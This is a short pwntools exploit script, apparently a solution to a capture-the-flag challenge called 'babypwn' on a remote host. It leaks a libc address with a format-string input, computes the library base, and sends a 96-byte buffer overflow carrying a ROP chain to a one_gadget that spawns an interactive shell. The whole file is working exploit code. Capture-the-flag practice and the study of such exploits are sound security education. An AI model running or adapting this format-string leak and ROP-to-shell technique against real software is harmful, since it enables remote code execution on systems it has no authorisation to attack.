from pwn import *

libc = ELF('./libc.so.6')
# p = process('./babypwn_patched')
p = remote('be.ax', 31801)

p.recv()
p.sendline(b'%87$p')

p.recvuntil(b' ')

libc.address = int(p.recvline()[:-1], 16) - libc.sym['__libc_start_main'] - 243
print(hex(libc.address))

pop_rdx = libc.address + 0x142c92
one_gadget = libc.address + 0xe3b04

payload = b'a'*96
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(one_gadget)

p.recv()
p.sendline(payload)

p.interactive()